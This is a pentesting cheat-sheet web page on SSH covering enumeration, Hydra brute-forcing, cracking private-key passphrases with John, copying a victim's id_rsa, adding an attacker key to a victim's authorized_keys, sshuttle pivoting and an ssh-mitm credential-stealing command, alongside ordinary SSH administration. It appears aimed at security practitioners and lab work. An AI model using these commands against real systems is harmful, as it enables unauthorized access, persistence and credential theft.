<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="readloud">
    
    <link rel="shortcut icon" href="../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>SSH (Secure Shell) Pentesting - readloud.org</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "SSH (Secure Shell) Pentesting", url: "#_top", children: [
              {title: "Enumeration", url: "#enumeration" },
              {title: "Investigation", url: "#investigation" },
              {title: "Configuration Files", url: "#configuration-files" },
              {title: "Connect", url: "#connect" },
              {title: "Transfer Files", url: "#transfer-files" },
              {title: "Create SSH Keys", url: "#create-ssh-keys" },
              {title: "Generate SSH Keys and Set Up Public Key to Connect Remote Machine", url: "#generate-ssh-keys-and-set-up-public-key-to-connect-remote-machine" },
              {title: "SSH Server", url: "#ssh-server" },
              {title: "SSH Proxy Server", url: "#ssh-proxy-server" },
              {title: "SSH-MITM for Stealing Credentials", url: "#ssh-mitm-for-stealing-credentials" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    

    <h1 id="ssh-secure-shell-pentesting">SSH (Secure Shell) Pentesting</h1>
<p>SSH is a cryptographic network protocol for operating network services securely over an unsecured network. A </p>
<div class="language-text highlight"><pre><span></span><code>- [linux-restricted-shell](https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf)
</code></pre></div>
<h2 id="enumeration">Enumeration</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>nmap --script ssh-brute -p 22 &lt;target-ip&gt;
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>nmap --script ssh-auth-methods --script-args=&quot;ssh.user=username&quot; -p 22 &lt;target-ip&gt;
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>nmap --script ssh-* -p 22 &lt;target-ip&gt;
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a># User enumeration
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>msfconsole
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>msf&gt; use auxiliary/scanner/ssh/ssh_enumusers
</span></code></pre></div>
<h3 id="brute-force-credentials">Brute Force Credentials</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a># -t: tasks
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>hydra -l username -P passwords.txt &lt;target-ip&gt; ssh -t 4
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>hydra -L usernames.txt -p password &lt;target-ip&gt; ssh -t 4
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a># Specific ports
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>hydra -l username -P passwords.txt -s 2222 &lt;target-ip&gt; ssh -t 4
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>hydra -l username -P passwords.txt ssh://&lt;target-ip&gt;:2222 -t 4
</span></code></pre></div>
<p>If the target host opens port 80 or 443, you can generate wordlist from the contents of the website then use Hydra.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>cewl http://&lt;target-ip&gt; &gt; wordlist.txt
</span></code></pre></div>
<h3 id="crack-ssh-private-key">Crack SSH Private Key</h3>
<p>First of all, you need to format the private key to make John to recognize it.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>ssh2john private_key.txt &gt; hash.txt
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a># or
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>python2 /usr/share/john/ssh2john.py private_key.txt &gt; hash.txt
</span></code></pre></div>
<p>Crack the password of the private key using the formatted text.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>john --wordlist=wordlist.txt hash.txt
</span></code></pre></div>
<h2 id="investigation">Investigation</h2>
<h3 id="banner-grabbing">Banner Grabbing</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>nc &lt;target-ip&gt; 22
</span></code></pre></div>
<p>Also, <strong><a href="https://github.com/jtesta/ssh-audit">ssh-audit</a></strong> is an useful tool for SSH server and client auditing.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>ssh-audit &lt;target-ip&gt;
</span></code></pre></div>
<h2 id="configuration-files">Configuration Files</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a># SSH client
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>cat /etc/ssh/ssh_config
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a># SSH server
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>cat /etc/ssh/sshd_config
</span></code></pre></div>
<h2 id="connect">Connect</h2>
<p>If you know a target credential, you can connect a remote server over SSH using the credential.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>ssh username@&lt;target-ip&gt;
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>ssh username@&lt;target-ip&gt; -p 22
</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>
</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a># Using private key
</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>ssh -i id_rsa username@&lt;target-ip&gt;
</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>
</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a># Without username
</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>ssh 10.0.0.1
</span></code></pre></div>
<h3 id="additional-options">Additional Options</h3>
<p>If we got the error message <strong>"no matching host key type found. Their offer: ssh-rsa..."</strong>, add the following flag.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>ssh -o HostKeyAlgorithms=+ssh-rsa user@10.0.0.1
</span></code></pre></div>
<p>If we got error <strong>"no matching key exchange method found. Their offer: diffie-hellman-..."</strong>, add the <strong>"KexAlgorithms"</strong> flag as below.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 user@10.0.0.1
</span></code></pre></div>
<h3 id="execute-commands-after-connecting">Execute Commands after Connecting</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>ssh username@&lt;target-ip&gt; &#39;ls -l&#39;
</span></code></pre></div>
<h3 id="test-connection">Test Connection</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>ssh -T username@10.0.0.1
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>ssh -T username@10.0.0.1 -vvv
</span></code></pre></div>
<h3 id="connect-to-windows-via-active-directory">Connect to Windows via Active Directory</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>ssh domain-name\\username@domain-controller
</span></code></pre></div>
<h3 id="connect-using-an-existing-private-key">Connect using an Existing Private Key</h3>
<ol>
<li>
<p><strong>Copy the Content of id_rsa (Private Key)</strong></p>
<p>In remote machine,</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>cat /home/&lt;victim-user&gt;/.ssh/id_rsa
</span></code></pre></div>
</li>
<li>
<p><strong>Create New Private Key in Local Machine</strong></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>echo &#39;copied content of id_rsa&#39; &gt; private_key.txt
</span></code></pre></div>
<p>Don't forget to change permission this file. Otherwise, you cannot connect remote server.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>chmod 600 private_key.txt
</span></code></pre></div>
</li>
<li>
<p><strong>Connect using Private Key</strong></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>ssh -i private_key.txt victim-user@&lt;remote-ip&gt;
</span></code></pre></div>
<p>If the error “error in libcrypto” occured, edit the format of the RSA private key.<br />
The correct format is below:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>-----BEGIN RSA PRIVATE KEY-----
</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>Proc-Type:4,ENCRYPTED
</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>DEK-Info:AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E
</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>
</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU
</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a>...
</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>...
</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a>...
</span><span id="__span-18-10"><a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a>7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD
</span><span id="__span-18-11"><a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a>-----END RSA PRIVATE KEY-----
</span></code></pre></div>
</li>
</ol>
<h2 id="transfer-files">Transfer Files</h2>
<h3 id="send-a-filedirectory-to-another-machine">Send a File/Directory to Another Machine</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a># Send a file
</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>scp ./example.txt user@&lt;ip&gt;:./example.txt
</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>
</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a># Send a directory
</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>scp -r ./example user@&lt;ip&gt;:/home/&lt;ip&gt;/
</span></code></pre></div>
<h3 id="download-a-filedirectory-from-another-machine">Download a File/Directory from Another Machine</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a># Download a file
</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>scp user@&lt;ip&gt;:/home/&lt;user&gt;/path/to/file.txt .
</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>
</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a># Download a directory
</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>scp -r user@&lt;ip&gt;:/home/&lt;user&gt;/path/to/file.txt .
</span></code></pre></div>
<p>If you get error <strong>“connection refused”</strong>, the SSH server is not running in another machine. So you need to start the SSH server.</p>
<h2 id="create-ssh-keys">Create SSH Keys</h2>
<h3 id="generate-keys">Generate Keys</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>ssh-keygen
</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>
</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a># Specify the output file
</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>ssh-keygen -f key
</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a># Specify Ed25519
</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>ssy-keygen -t ed25519
</span></code></pre></div>
<h3 id="install-ssh-key">Install SSH Key</h3>
<p>In target machine,</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>ssh-copy-id username@&lt;target-ip&gt;
</span></code></pre></div>
<h2 id="generate-ssh-keys-and-set-up-public-key-to-connect-remote-machine">Generate SSH Keys and Set Up Public Key to Connect Remote Machine</h2>
<h3 id="1-check-if-authorized_keys-exists-in-remote-machine">1. Check if authorized_keys Exists in Remote Machine</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>ls /home/&lt;remote-user&gt;/.ssh/authorized_keys
</span></code></pre></div>
<p>If it exists, you may be able to connect SSH with your keys as victim user.</p>
<h3 id="2-generate-ssh-keys-in-local-machine">2. Generate SSH Keys in Local Machine</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>ssh-keygen -f key
</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>
</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a># Copy the content of publick key
</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>cat ./key.pub
</span></code></pre></div>
<p>Then copy the content of public key you generated.</p>
<h3 id="3-add-the-content-of-publick-key-to-authorized_keys">3. Add the Content of Publick Key to authorized_keys</h3>
<p>In remote machine,</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>echo &#39;&lt;content of id_rsa.pub&#39; &gt;&gt; /home/&lt;victim-user&gt;/.ssh/authorized_keys
</span></code></pre></div>
<h2 id="ssh-server">SSH Server</h2>
<h3 id="startstoprestart">Start/Stop/Restart</h3>
<ul>
<li>
<p><strong>Start</strong></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>sudo systemctl start ssh
</span></code></pre></div>
</li>
<li>
<p><strong>Stop</strong></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>sudo systemctl stop ssh
</span></code></pre></div>
</li>
<li>
<p><strong>Restart</strong></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>sudo systemctl restart ssh
</span></code></pre></div>
</li>
</ul>
<h3 id="status">Status</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>sudo systemctl status ssh
</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>
</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>ps -e | grep ssh
</span></code></pre></div>
<h3 id="configuration">Configuration</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>vim /etc/ssh/sshd_config
</span></code></pre></div>
<h3 id="check-for-any-established-connection">Check for any Established Connection</h3>
<p>To get the “pts/# terminal”, run the following command. The pts stands for pseudo terminal slave.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>who | grep &lt;username&gt;
</span></code></pre></div>
<p>To kill any connections, run the following commands.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a># -f: full process name to match
</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>sudo pkill -f pts/#
</span></code></pre></div>
<h3 id="logs">Logs</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a># Authentication logs
</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>grep &#39;sshd&#39; /var/log/auth.log
</span></code></pre></div>
<h2 id="ssh-proxy-server">SSH Proxy Server</h2>
<h3 id="sshuttle">Sshuttle</h3>
<p><strong><a href="https://github.com/sshuttle/sshuttle">sshuttle</a></strong> is transparent proxy server that works as a poor man's VPN. Forwards over ssh.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>sshuttle -r username@&lt;remote-ip&gt; &lt;remote-ip&gt;/24
</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>
</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a># Automatically determine subnet
</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a>sshuttle -r username@&lt;remote-ip&gt; -N
</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a>
</span><span id="__span-34-6"><a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a># Using private key
</span><span id="__span-34-7"><a id="__codelineno-34-7" name="__codelineno-34-7" href="#__codelineno-34-7"></a>sshuttle -r username@&lt;remote-ip&gt; --ssh-cmd &quot;ssh -i private_key&quot; &lt;remote-ip&gt;/24
</span><span id="__span-34-8"><a id="__codelineno-34-8" name="__codelineno-34-8" href="#__codelineno-34-8"></a>
</span><span id="__span-34-9"><a id="__codelineno-34-9" name="__codelineno-34-9" href="#__codelineno-34-9"></a># Exclude the specific ip (-x)
</span><span id="__span-34-10"><a id="__codelineno-34-10" name="__codelineno-34-10" href="#__codelineno-34-10"></a>sshuttle -r username@&lt;remote-ip&gt; &lt;remote-ip&gt;/24 -x &lt;remote-ip&gt;
</span></code></pre></div>
<p>Then you can access to other networks.</p>
<ul>
<li>
<p><strong>Troubleshooting</strong></p>
<p>If you get the error "Failed to flush caches: Unit dbus-org.freedesktop.resolve1.service not found...", you need to flush DNS cache.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>sudo systemctl enable systemd-resolved.service
</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>sudo resolvectl flush-caches
</span></code></pre></div>
<p>Run sshuttle again.</p>
</li>
</ul>
<h2 id="ssh-mitm-for-stealing-credentials">SSH-MITM for Stealing Credentials</h2>
<p>If the target system user try to connect arbitrary host using SSH, we might be able to steal credentials by listening via the SSH man-in-the-middle server.<br />
Run the following command in local machine.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a># If not have the ssh-mitm, install first.
</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>pip3 install ssh-mitm --upgrade
</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>
</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a># --enable-trivial-auth: The &quot;trivial authentication&quot; phishing attack
</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a># --remote-host: Specify the target ip/domain
</span><span id="__span-36-6"><a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a># --listen-port: Specify the ip address to listen in local machine
</span><span id="__span-36-7"><a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a>ssh-mitm server --enable-trivial-auth --remote-host example.com --listen-port 2222
</span></code></pre></div>

  <br>
    

    <br>
</div>

<footer class="col-md-12 wm-page-content">
      <p>
        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/network/pentesting/ssh-pentesting.md"><i class="fa fa-github"></i>
Edit on GitHub</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
</footer>

</body>
</html>